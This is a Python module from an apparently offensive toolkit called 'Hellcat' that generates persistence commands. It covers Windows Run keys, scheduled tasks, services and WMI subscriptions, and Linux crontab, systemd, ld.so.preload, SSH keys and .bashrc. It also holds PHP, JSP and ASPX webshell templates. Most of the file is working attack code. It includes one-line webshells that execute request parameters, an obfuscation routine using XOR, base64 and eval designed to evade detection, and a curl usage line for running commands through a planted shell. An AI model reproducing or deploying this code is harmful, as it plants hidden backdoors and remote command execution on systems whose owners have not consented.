"""
Hellcat Persistence Framework
=============================
Windows / Linux / Webshell persistence generators with 4 obfuscation levels.
"""
from __future__ import annotations

import base64
import os
import random
import string
from typing import Any, Dict, List, Optional

from hellcat.core.models import EvasionLevel, PersistenceType


# ---------------------------------------------------------------------------
# Windows Persistence
# ---------------------------------------------------------------------------

WINDOWS_TEMPLATES: Dict[PersistenceType, Dict[str, Any]] = {
    PersistenceType.REGISTRY: {
        "description": "Registry Run key persistence",
        "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {name} /t REG_SZ /d "{payload}" /f',
        "cleanup": 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {name} /f',
    },
    PersistenceType.SCHEDULED_TASK: {
        "description": "Scheduled Task persistence",
        "command": 'schtasks /create /tn "{name}" /tr "{payload}" /sc onlogon /rl highest /f',
        "cleanup": 'schtasks /delete /tn "{name}" /f',
    },
    PersistenceType.SERVICE: {
        "description": "Windows Service persistence",
        "command": 'sc create {name} binPath= "{payload}" start= auto',
        "cleanup": 'sc delete {name}',
    },
    PersistenceType.WMI_EVENT: {
        "description": "WMI Event Subscription persistence",
        "command": (
            'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilterToConsumerBinding '
            'CREATE Filter="__EventFilter.Name=\'{name}\'",'
            'Consumer="CommandLineEventConsumer.Name=\'{name}\'"'
        ),
        "cleanup": 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilterToConsumerBinding WHERE "Filter=\'__EventFilter.Name=\\\'{name}\\\'\'" DELETE',
    },
    PersistenceType.STARTUP_FOLDER: {
        "description": "Startup folder shortcut persistence",
        "command": 'copy "{payload}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.exe"',
        "cleanup": 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.exe"',
    },
}

# ---------------------------------------------------------------------------
# Linux Persistence
# ---------------------------------------------------------------------------

LINUX_TEMPLATES: Dict[PersistenceType, Dict[str, Any]] = {
    PersistenceType.CRONTAB: {
        "description": "Crontab persistence",
        "command": '(crontab -l 2>/dev/null; echo "*/5 * * * * {payload}") | crontab -',
        "cleanup": 'crontab -l | grep -v "{payload}" | crontab -',
    },
    PersistenceType.SYSTEMD: {
        "description": "Systemd service persistence",
        "unit_file": (
            "[Unit]\nDescription={name}\nAfter=network.target\n\n"
            "[Service]\nType=simple\nExecStart={payload}\nRestart=always\n\n"
            "[Install]\nWantedBy=multi-user.target\n"
        ),
        "command": 'echo \'{unit}\' > /etc/systemd/system/{name}.service && systemctl enable {name} && systemctl start {name}',
        "cleanup": 'systemctl stop {name} && systemctl disable {name} && rm /etc/systemd/system/{name}.service',
    },
    PersistenceType.LD_PRELOAD: {
        "description": "LD_PRELOAD shared library hijacking",
        "command": 'echo "{payload}" >> /etc/ld.so.preload',
        "cleanup": 'sed -i "/{payload}/d" /etc/ld.so.preload',
    },
    PersistenceType.SSH_KEY: {
        "description": "SSH authorized_keys persistence",
        "command": 'echo "{pubkey}" >> ~/.ssh/authorized_keys',
        "cleanup": 'sed -i "/{key_comment}/d" ~/.ssh/authorized_keys',
    },
    PersistenceType.SHELL_RC: {
        "description": "Shell RC file persistence (.bashrc / .zshrc)",
        "command": 'echo "{payload}" >> ~/.bashrc',
        "cleanup": 'sed -i "/{marker}/d" ~/.bashrc',
    },
}

# ---------------------------------------------------------------------------
# Webshell Templates
# ---------------------------------------------------------------------------

WEBSHELL_TEMPLATES: Dict[str, str] = {
    "php_basic": '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>',
    "php_eval": '<?php @eval($_POST["c"]); ?>',
    "php_obfuscated": '<?php $a=str_rot13("riny");$a($_POST["c"]); ?>',
    "jsp_basic": '<% Runtime.getRuntime().exec(request.getParameter("c")); %>',
    "aspx_basic": '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["c"]);%>',
}


def _random_name(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


def _obfuscate_webshell(code: str, level: EvasionLevel) -> str:
    if level == EvasionLevel.MINIMAL:
        return code
    if level == EvasionLevel.MEDIUM:
        return base64.b64encode(code.encode()).decode()
    if level == EvasionLevel.HIGH:
        key = random.randint(1, 255)
        xored = "".join(chr(ord(c) ^ key) for c in code)
        return base64.b64encode(xored.encode("latin-1")).decode()
    # EXTREME: variable name randomization + multi-layer encode
    var = _random_name(6)
    encoded = base64.b64encode(code.encode()).decode()
    return f'<?php ${var}=base64_decode("{encoded}");eval(${var}); ?>'


# ---------------------------------------------------------------------------
# Persistence Generator
# ---------------------------------------------------------------------------

class PersistenceGenerator:
    """Generate persistence commands for Win/Linux/Web."""

    @staticmethod
    def generate_windows(method: PersistenceType, payload: str,
                         name: Optional[str] = None) -> Dict[str, str]:
        name = name or _random_name()
        tpl = WINDOWS_TEMPLATES.get(method)
        if not tpl:
            return {"error": f"Unsupported Windows method: {method.value}"}
        return {
            "method": method.value,
            "description": tpl["description"],
            "install": tpl["command"].format(name=name, payload=payload),
            "cleanup": tpl["cleanup"].format(name=name, payload=payload),
        }

    @staticmethod
    def generate_linux(method: PersistenceType, payload: str,
                       name: Optional[str] = None) -> Dict[str, str]:
        name = name or _random_name()
        tpl = LINUX_TEMPLATES.get(method)
        if not tpl:
            return {"error": f"Unsupported Linux method: {method.value}"}
        cmd = tpl["command"]
        if method == PersistenceType.SYSTEMD:
            unit = tpl["unit_file"].format(name=name, payload=payload)
            cmd = cmd.format(name=name, payload=payload, unit=unit)
        else:
            cmd = cmd.format(name=name, payload=payload, marker=name,
                             pubkey=payload, key_comment=name)
        cleanup = tpl["cleanup"].format(name=name, payload=payload, marker=name,
                                         key_comment=name)
        return {
            "method": method.value,
            "description": tpl["description"],
            "install": cmd,
            "cleanup": cleanup,
        }

    @staticmethod
    def generate_webshell(shell_type: str = "php_basic",
                          level: EvasionLevel = EvasionLevel.MINIMAL,
                          param_name: str = "c") -> Dict[str, str]:
        base_code = WEBSHELL_TEMPLATES.get(shell_type, WEBSHELL_TEMPLATES["php_basic"])
        code = _obfuscate_webshell(base_code, level)
        ext = "php" if "php" in shell_type else "jsp" if "jsp" in shell_type else "aspx"
        filename = f"{_random_name(10)}.{ext}"
        return {
            "type": shell_type,
            "evasion_level": level.value,
            "filename": filename,
            "code": code,
            "usage": f"curl target/{filename}?{param_name}=whoami",
        }

    @staticmethod
    def list_methods(os_type: str = "all") -> List[str]:
        methods = []
        if os_type in ("all", "windows"):
            methods.extend(m.value for m in WINDOWS_TEMPLATES)
        if os_type in ("all", "linux"):
            methods.extend(m.value for m in LINUX_TEMPLATES)
        if os_type in ("all", "web"):
            methods.extend(WEBSHELL_TEMPLATES.keys())
        return methods
